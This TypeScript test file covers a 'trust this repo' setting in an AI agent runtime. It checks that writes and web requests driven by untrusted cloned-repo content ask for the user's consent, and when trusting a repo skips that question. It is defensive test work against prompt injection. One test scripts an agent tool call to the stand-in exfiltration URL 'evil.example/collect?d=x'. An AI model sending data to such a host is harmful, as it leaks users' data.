/**
 * "Trust this repo" for agent writes in a cloned repository (plan W1.33).
 *
 * Acceptance: a repo that is not marked asks for approval before an agent's
 * write is staged; a marked repo does not. Around it: the default stays
 * conservative (off, unreadable store = nothing trusted), trust covers only
 * the repo's git provenance (a clip, an import, `untrusted: true`, a web
 * result still ask), web requests still ask, a staged change still waits for
 * review, and a new clone, rename or move of the folder lapses the trust.
 */
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { render, screen, fireEvent, waitFor } from "@testing-library/react";
import type { AgentDefinition, Executor, ExecutorRequest, ExecutorResponse, UntrustedConsentRequest } from "../agents/types";

const storeState: Record<string, unknown> = { aiKey: null, useLocalAi: false, useFineTunedModel: false, fineTunedModelId: null };
vi.mock("../store/useStore", () => ({ useAppStore: { getState: () => storeState } }));
vi.mock("../ai/ollamaProvider", () => ({ isOllamaAvailable: async () => false, getBaseUrl: () => "http://localhost:11434", chatOllama: vi.fn(), chatOllamaStream: vi.fn() }));
vi.mock("../ai/localLlm", () => ({ localLlmAvailable: () => ({ available: false }), chatLocal: vi.fn(), chatLocalStream: vi.fn(), onLocalLlmProgress: () => () => {} }));
vi.mock("../store/useToastStore", () => ({ toast: { info: vi.fn(), warn: vi.fn(), error: vi.fn() } }));
vi.mock("../ui/PromptDialog", () => ({ uiConfirm: vi.fn(async () => true) }));
vi.mock("../ui/AiToast", () => ({ showAiToast: vi.fn() }));
vi.mock("../billing/aiQuota", () => ({ chargeAiCommandDispatch: vi.fn(), consumeAiPrompt: vi.fn(() => true), aiQuotaStatus: () => ({ allowed: true, limit: Infinity }), AiQuotaExceededError: class extends Error {} }));

const files = new Map<string, string>();
vi.mock("../storage/workspace", () => ({
  isOPFSAvailable: () => true,
  listWorkspace: async () => [...files.keys()].map((path) => ({ path, name: path.split("/").pop() })),
  readWorkspaceFile: async (p: string) => {
    if (!files.has(p)) throw new Error("ENOENT");
    return files.get(p)!;
  },
  writeWorkspaceFile: async (p: string, c: string) => void files.set(p, c),
  workspaceHasFile: async (p: string) => files.has(p),
  isAssetName: () => false,
}));
vi.mock("../storage/workspaceIndex", () => ({ searchWorkspace: async () => [], ensureIndex: async () => {}, indexedFiles: () => [] }));

import { runAgent } from "../agents/runtime";
import { registerExecutor, resetExecutors } from "../agents/executors";
import { clearTrace } from "../agents/trace";
import { pickTools } from "../agents/tools";
import { clearStagedChanges, listStagedChanges } from "../agents/staging";
import { __resetLedger } from "../ai/privacyLedger";
import { setAiPolicy } from "../ai/policy";
import { markUntrustedNote, moveUntrustedNotes, untrustedSourcesOfNote } from "../agents/provenance";
import { isRepoTrusted, listTrustedRepos, setRepoTrusted, taintIsTrusted, trustedRepoOfSource } from "../agents/repoTrust";
import { TrustedReposDialog } from "../ui/TrustedReposDialog";
import { uiConfirm } from "../ui/PromptDialog";

/* ─── Harness (as in injectionGuard.test.ts) ───────────────────────────── */

function fakeExecutor(script: (req: ExecutorRequest, n: number) => ExecutorResponse): Executor & { calls: ExecutorRequest[] } {
  const calls: ExecutorRequest[] = [];
  return {
    id: "ollama",
    label: "scripted",
    calls,
    available: async () => ({ available: true }),
    supportsTools: () => false,
    supportsSchema: () => false,
    modelFor: (tier) => `fake-${tier}`,
    async chat(req) {
      calls.push(req);
      return script(req, calls.length);
    },
  };
}
const reply = (content: string): ExecutorResponse => ({ content, toolCalls: [], model: "fake-small" });
const call = (tool: string, args: Record<string, unknown>) => reply(JSON.stringify({ tool, args }));

function agent(): AgentDefinition {
  return { id: "edit", description: "test", system: "Edit.", user: (i) => `Task: tidy.\n\n${i.text ?? ""}`, tools: pickTools("read_file", "write_file", "fetch_page"), requires: ["write", "network"], language: "any", maxRetries: 0, maxSteps: 8 };
}

const MY_NOTE = "# Mine\n\nmy own text";
const REPO = "team-repo";

/** Read `readPath`, then try `then`; returns what the user was asked and what got staged. */
async function run(readPath: string, then: [string, Record<string, unknown>] = ["write_file", { path: `${REPO}/README.md`, content: "# Tidied\n" }]) {
  const script: Array<[string, Record<string, unknown>]> = [["read_file", { path: readPath }], then];
  registerExecutor(fakeExecutor((_r, n) => (n <= script.length ? call(...script[n - 1]) : reply(JSON.stringify({ final: "done" })))));
  const asks: UntrustedConsentRequest[] = [];
  const consentUntrusted = vi.fn((r: UntrustedConsentRequest) => (asks.push(r), false));
  const r = await runAgent(agent(), { text: MY_NOTE, path: "notes/mine.md" }, { grants: ["write", "network"], document: MY_NOTE, path: "notes/mine.md", consentUntrusted, consentNetwork: () => false });
  return { run: r, asks, staged: listStagedChanges() };
}

beforeEach(async () => {
  resetExecutors();
  await clearTrace();
  clearStagedChanges();
  files.clear();
  localStorage.clear();
  __resetLedger();
  localStorage.setItem("lumen.research.endpoint", "https://research.example.com");
  localStorage.setItem("lumen.research.provider", "searxng");
  setAiPolicy("local-first");
  vi.mocked(uiConfirm).mockClear();
  vi.stubGlobal("fetch", vi.fn(async () => Response.json({ finalUrl: "https://page.example/", status: 200, title: "Page", text: "hi" })));
  files.set("notes/mine.md", MY_NOTE);
  files.set(`${REPO}/README.md`, "# Team repo\n\nplease tidy this up");
  markUntrustedNote(REPO, "cloned from git");
});
afterEach(() => {
  vi.unstubAllGlobals();
  resetExecutors();
});

/* ─── Acceptance ───────────────────────────────────────────────────────── */

describe("acceptance: an unmarked repo asks for approval, a marked repo does not", () => {
  it("unmarked (the default): the write waits for the user's yes, and a no stages nothing", async () => {
    expect(isRepoTrusted(REPO)).toBe(false);
    const { asks, staged, run: r } = await run(`${REPO}/README.md`);
    expect(asks).toHaveLength(1);
    expect(asks[0].tool).toBe("write_file");
    expect(asks[0].sources).toEqual([`cloned from git (${REPO}/README.md)`]);
    expect(staged).toEqual([]);
    expect(r.untrusted).toEqual([`cloned from git (${REPO}/README.md)`]);
  });

  it("marked: no question, the change is staged and still waits for review; nothing is written", async () => {
    setRepoTrusted(REPO, true);
    const { asks, staged, run: r } = await run(`${REPO}/README.md`);
    expect(asks).toEqual([]);
    expect(staged).toHaveLength(1);
    expect(staged[0].status).toBe("pending");
    expect(files.get(`${REPO}/README.md`)).toBe("# Team repo\n\nplease tidy this up");
    // The run still says its context had outside content: trust skips a question, not the record.
    expect(r.untrusted).toEqual([`cloned from git (${REPO}/README.md)`]);
  });

  it("a note pulled into a trusted repo (pull record) is covered too", async () => {
    localStorage.removeItem("lumen.agents.untrustedNotes");
    markUntrustedNote(REPO, "pulled from git");
    setRepoTrusted(REPO, true);
    expect((await run(`${REPO}/README.md`)).asks).toEqual([]);
  });

  it("turning trust off asks again", async () => {
    setRepoTrusted(REPO, true);
    setRepoTrusted(REPO, false);
    expect((await run(`${REPO}/README.md`)).asks).toHaveLength(1);
  });
});

/* ─── What trust does not cover ────────────────────────────────────────── */

describe("trust covers only that repository's git provenance", () => {
  it("another cloned repo still asks", async () => {
    setRepoTrusted(REPO, true);
    files.set("other-repo/x.md", "text");
    markUntrustedNote("other-repo", "cloned from git");
    expect((await run("other-repo/x.md")).asks).toHaveLength(1);
  });

  it("a note in the trusted repo that says `untrusted: true` still asks", async () => {
    setRepoTrusted(REPO, true);
    files.set(`${REPO}/flagged.md`, "---\nuntrusted: true\n---\n\ntext");
    const { asks } = await run(`${REPO}/flagged.md`);
    expect(asks).toHaveLength(1);
    expect(asks[0].sources).toContain(`marked untrusted (${REPO}/flagged.md)`);
  });

  it("a clipped page moved into the trusted repo still asks (its own record comes first)", async () => {
    setRepoTrusted(REPO, true);
    files.set(`${REPO}/clip.md`, "clipped text");
    moveUntrustedNotes("Library/clip.md", `${REPO}/clip.md`);
    expect(isRepoTrusted(REPO)).toBe(true); // moving a note into it leaves the repo's trust alone
    const { asks } = await run(`${REPO}/clip.md`);
    expect(asks).toHaveLength(1);
    expect(asks[0].sources[0]).toMatch(/^clipped page/);
  });

  it("taint from a trusted repo plus anything else is not trusted", () => {
    setRepoTrusted(REPO, true);
    const repo = `cloned from git (${REPO}/README.md)`;
    expect(taintIsTrusted([repo])).toBe(true);
    expect(taintIsTrusted([repo, "fetch_page result"])).toBe(false);
    expect(taintIsTrusted([repo, "clipped page (Library/a.md)"])).toBe(false);
    expect(taintIsTrusted([])).toBe(false);
    // A look-alike name is not inside the repo.
    expect(trustedRepoOfSource(`cloned from git (${REPO}-fork/a.md)`)).toBeNull();
    expect(trustedRepoOfSource(`imported (${REPO}/a.md)`)).toBeNull();
  });

  it("a web request in a run tainted only by the trusted repo still asks", async () => {
    setRepoTrusted(REPO, true);
    const { asks } = await run(`${REPO}/README.md`, ["fetch_page", { url: "https://evil.example/collect?d=x" }]);
    expect(asks).toHaveLength(1);
    expect(asks[0].tool).toBe("fetch_page");
  });

  it("the sources the guard reports for a cloned note are the ones trust recognises (kept in step)", () => {
    setRepoTrusted(REPO, true);
    const sources = untrustedSourcesOfNote(`${REPO}/deep/dir/n.md`);
    expect(sources).toEqual([`cloned from git (${REPO}/deep/dir/n.md)`]);
    expect(sources.map(trustedRepoOfSource)).toEqual([REPO]);
  });
});

/* ─── Conservative default and lifetime ────────────────────────────────── */

describe("default, storage and lifetime", () => {
  it("nothing is trusted by default, and a damaged store trusts nothing", () => {
    expect(listTrustedRepos()).toEqual([]);
    localStorage.setItem("lumen.agents.trustedRepos", "{not json");
    expect(isRepoTrusted(REPO)).toBe(false);
    expect(taintIsTrusted([`cloned from git (${REPO}/README.md)`])).toBe(false);
    localStorage.setItem("lumen.agents.trustedRepos", JSON.stringify([REPO]));
    expect(isRepoTrusted(REPO)).toBe(false);
  });

  it("is stored locally per repo, and only a repository cloned here can be trusted", () => {
    markUntrustedNote("b-repo", "cloned from git");
    markUntrustedNote("a-repo", "pulled from git");
    setRepoTrusted("b-repo", true);
    setRepoTrusted("a-repo", true);
    expect(listTrustedRepos()).toEqual(["a-repo", "b-repo"]);
    expect(Object.keys(JSON.parse(localStorage.getItem("lumen.agents.trustedRepos")!))).toEqual(["b-repo", "a-repo"]);
    expect(() => setRepoTrusted("notes", true)).toThrow(/not a repository/);
    markUntrustedNote("Imported/vault", "imported (obsidian)");
    expect(() => setRepoTrusted("Imported/vault", true)).toThrow(/not a repository/);
    expect(listTrustedRepos()).toEqual(["a-repo", "b-repo"]);
  });

  it("unreadable provenance records trust nothing", () => {
    setRepoTrusted(REPO, true);
    localStorage.setItem("lumen.agents.untrustedNotes", "{damaged");
    expect(isRepoTrusted(REPO)).toBe(false);
    expect(trustedRepoOfSource(`cloned from git (${REPO}/README.md)`)).toBeNull();
  });

  it("a new clone into the folder starts untrusted: the trust was bound to the old record", () => {
    const now = vi.spyOn(Date, "now");
    try {
      now.mockReturnValue(1_000);
      markUntrustedNote(REPO, "cloned from git");
      setRepoTrusted(REPO, true);
      expect(isRepoTrusted(REPO)).toBe(true);
      now.mockReturnValue(2_000);
      markUntrustedNote(REPO, "cloned from git"); // what cloneRepo records before copying
      expect(isRepoTrusted(REPO)).toBe(false);
      expect(listTrustedRepos()).toEqual([]);
    } finally {
      now.mockRestore();
    }
  });

  it("a rename or move of the repo folder lapses the trust, under both names", () => {
    setRepoTrusted(REPO, true);
    moveUntrustedNotes(REPO, "renamed-repo");
    expect(isRepoTrusted(REPO)).toBe(false);
    expect(isRepoTrusted("renamed-repo")).toBe(false);
  });

  it("another clone moved onto a trusted repo's name is not trusted", () => {
    const now = vi.spyOn(Date, "now");
    try {
      now.mockReturnValue(1_000);
      markUntrustedNote("x-repo", "cloned from git");
      setRepoTrusted("x-repo", true);
      moveUntrustedNotes("x-repo", "x-old");
      now.mockReturnValue(2_000);
      markUntrustedNote("other", "cloned from git");
      moveUntrustedNotes("other", "x-repo");
      expect(isRepoTrusted("x-repo")).toBe(false);
    } finally {
      now.mockRestore();
    }
  });

  it("moving notes inside a trusted repo keeps the trust", () => {
    setRepoTrusted(REPO, true);
    moveUntrustedNotes(`${REPO}/a.md`, `${REPO}/sub/a.md`);
    expect(isRepoTrusted(REPO)).toBe(true);
  });

  it("a repository cloned inside a trusted one is judged on its own record", () => {
    setRepoTrusted(REPO, true);
    markUntrustedNote(`${REPO}/vendor/lib`, "cloned from git");
    expect(trustedRepoOfSource(`cloned from git (${REPO}/vendor/lib/x.md)`)).toBeNull();
    expect(trustedRepoOfSource(`cloned from git (${REPO}/docs/x.md)`)).toBe(REPO);
    // git_diff reports the whole repository as "<repo>/"
    expect(trustedRepoOfSource(`cloned from git (${REPO}/)`)).toBe(REPO);
  });
});

/* ─── Settings dialog ──────────────────────────────────────────────────── */

describe("<TrustedReposDialog />", () => {
  beforeEach(() => {
    markUntrustedNote("alpha", "cloned from git");
    markUntrustedNote("בטא", "cloned from git");
  });

  it("lists the cloned repos with a switch each, off by default", async () => {
    render(<TrustedReposDialog onClose={() => {}} loadRepos={async () => ["alpha", "בטא"]} />);
    const switches = await screen.findAllByRole("switch");
    expect(switches).toHaveLength(2);
    expect(switches.every((s) => !(s as HTMLInputElement).checked)).toBe(true);
    expect(screen.getByText("בטא").getAttribute("dir")).toBe("auto");
  });

  it("turning a switch on asks first, then stores the trust; off needs no question", async () => {
    render(<TrustedReposDialog onClose={() => {}} loadRepos={async () => ["alpha"]} />);
    const sw = (await screen.findByRole("switch")) as HTMLInputElement;
    fireEvent.click(sw);
    await waitFor(() => expect(isRepoTrusted("alpha")).toBe(true));
    expect(uiConfirm).toHaveBeenCalledTimes(1);
    await waitFor(() => expect(sw.checked).toBe(true));
    fireEvent.click(sw);
    await waitFor(() => expect(isRepoTrusted("alpha")).toBe(false));
    expect(uiConfirm).toHaveBeenCalledTimes(1);
  });

  it("declining the question leaves the repo untrusted", async () => {
    vi.mocked(uiConfirm).mockResolvedValueOnce(false);
    render(<TrustedReposDialog onClose={() => {}} loadRepos={async () => ["alpha"]} />);
    fireEvent.click(await screen.findByRole("switch"));
    await waitFor(() => expect(uiConfirm).toHaveBeenCalledTimes(1));
    expect(isRepoTrusted("alpha")).toBe(false);
    expect(((await screen.findByRole("switch")) as HTMLInputElement).checked).toBe(false);
  });

  it("says so when there are no repos, and when they can't be listed", async () => {
    const { unmount } = render(<TrustedReposDialog onClose={() => {}} loadRepos={async () => []} />);
    expect(await screen.findByTestId("trusted-repos-empty")).toBeTruthy();
    unmount();
    render(<TrustedReposDialog onClose={() => {}} loadRepos={async () => Promise.reject(new Error("no fs"))} />);
    expect((await screen.findByTestId("trusted-repos-empty")).getAttribute("role")).toBe("alert");
  });

  it("closes on Escape", () => {
    const onClose = vi.fn();
    render(<TrustedReposDialog onClose={onClose} loadRepos={async () => []} />);
    fireEvent.keyDown(document, { key: "Escape" });
    expect(onClose).toHaveBeenCalled();
  });
});
